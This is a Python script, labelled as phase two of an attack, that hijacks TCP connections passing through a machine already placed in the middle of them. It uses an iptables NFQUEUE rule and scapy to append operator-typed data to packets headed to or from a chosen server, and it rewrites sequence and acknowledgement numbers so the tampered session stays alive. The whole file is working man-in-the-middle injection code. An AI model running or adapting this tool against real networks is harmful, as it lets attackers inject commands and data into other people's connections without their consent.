import os
from scapy.all import *
from netfilterqueue import NetfilterQueue
import sys
import threading
import readline

# PHASE II OF THE ATTACK

global server_ip 
global server_port
hijack_payoad = b''
lock = threading.Lock()
#client_seq, server_seq := Dict< (ip_address, port) : [Dict<seq: seqReplacement>, finished] >
#client_ack, server_ack := Dict< (ip_address, port) : [Dict<ack: ackReplacement>, finished] >
client_seq = {}
client_ack = {}
server_seq = {}
server_ack = {}

def read_hijack_payload():
    global hijack_payoad
    while True:
        try:
            new_hijack_payload = input().encode()
            with lock:
                hijack_payoad = new_hijack_payload
            print(f'Changed payload to {new_hijack_payload}')
        except KeyboardInterrupt:
            break


def detect_and_alter_packet(packet):
    octets = packet.get_payload()
    scapy_packet = IP(octets)
    if (scapy_packet[IP].src == server_ip and scapy_packet[TCP].sport == server_port) or (scapy_packet[IP].dst == server_ip and scapy_packet[TCP].dport == server_port):  
        
        client_ip = scapy_packet[IP].src if scapy_packet[IP].dst == server_ip else scapy_packet[IP].dst
        client_port = scapy_packet[TCP].sport if scapy_packet[IP].dst == server_ip else scapy_packet[TCP].dport

        scapy_packet = alter_packet(scapy_packet, client_ip, client_port)
        
    send(scapy_packet, verbose=False)


def alter_packet(scapy_packet, client_ip, client_port):
    global hijack_payoad
    seq = scapy_packet[TCP].seq
    ack = scapy_packet[TCP].ack
    packet_is_for_server = scapy_packet[IP].dst == server_ip
    if (client_ip, client_port) not in client_seq.keys() or (client_seq[(client_ip, client_port)][1] == True and ''.join(scapy_packet[TCP].flags) == 'S'):
        print(f'Hijacked connection between ({scapy_packet[IP].src}, {scapy_packet[TCP].sport}) and ({scapy_packet[IP].dst}, {scapy_packet[TCP].dport})')
        client_seq[(client_ip, client_port)] = [{}, False]
        client_ack[(client_ip, client_port)] = [{}, False]
        server_seq[(client_ip, client_port)] = [{}, False]
        server_ack[(client_ip, client_port)] = [{}, False]

    if packet_is_for_server:
        scapy_packet[TCP].seq = client_seq[(client_ip, client_port)][0][seq] if seq in client_seq[(client_ip, client_port)][0].keys() else scapy_packet[TCP].seq
        scapy_packet[TCP].ack = client_ack[(client_ip, client_port)][0][ack] if ack in client_ack[(client_ip, client_port)][0].keys() else scapy_packet[TCP].ack
    else:
        scapy_packet[TCP].seq = server_seq[(client_ip, client_port)][0][seq] if seq in server_seq[(client_ip, client_port)][0].keys() else scapy_packet[TCP].seq
        scapy_packet[TCP].ack = server_ack[(client_ip, client_port)][0][ack] if ack in server_ack[(client_ip, client_port)][0].keys() else scapy_packet[TCP].ack


    if 'PA' in ''.join(scapy_packet[TCP].flags):
        old_payload = scapy_packet[Raw].load

        with lock:
            new_payload = old_payload + hijack_payoad

        scapy_packet[Raw].load = new_payload
        modified_seq = scapy_packet[TCP].seq

        if packet_is_for_server:
            server_ack[(client_ip, client_port)][0][modified_seq + len(new_payload)] = seq + len(old_payload)
            client_seq[(client_ip, client_port)][0][seq + len(old_payload)] = modified_seq + len(new_payload)
        else:
            client_ack[(client_ip, client_port)][0][modified_seq + len(new_payload)] = seq + len(old_payload)
            server_seq[(client_ip, client_port)][0][seq + len(old_payload)] = modified_seq + len(new_payload)        

    if ('F' in ''.join(scapy_packet[TCP].flags) or 'R' in ''.join(scapy_packet[TCP].flags)) and client_seq[(client_ip, client_port)][1] == False:
        client_seq[(client_ip, client_port)][1] = True
        client_ack[(client_ip, client_port)][1] = True
        server_seq[(client_ip, client_port)][1] = True
        server_ack[(client_ip, client_port)][1] = True
        print(f'Ended connection between ({scapy_packet[IP].src}, {scapy_packet[TCP].sport}) and ({scapy_packet[IP].dst}, {scapy_packet[TCP].dport})')

    del scapy_packet[IP].len
    del scapy_packet[IP].chksum
    del scapy_packet[TCP].chksum
    return scapy_packet


def main(argv):
    global server_ip
    global server_port
    if len(argv) !=3:
        print(f"Usage: {argv[0]} [server_ip_address] [server_port]")
        exit()

    server_ip = argv[1]
    server_port = int(argv[2])
    queue = NetfilterQueue()
    
    try:
        os.system("iptables -A FORWARD -p tcp -j NFQUEUE --queue-num 10")
        queue.bind(10, detect_and_alter_packet)
        print('Waiting for connections...')
        print('Everything you write in terminal will be used as the payload')
        thread = threading.Thread(target = read_hijack_payload)
        thread.start()
        queue.run()
    except KeyboardInterrupt:
        os.system("iptables --flush")
        queue.unbind()
        thread.join()

if __name__ == '__main__':
    main(sys.argv)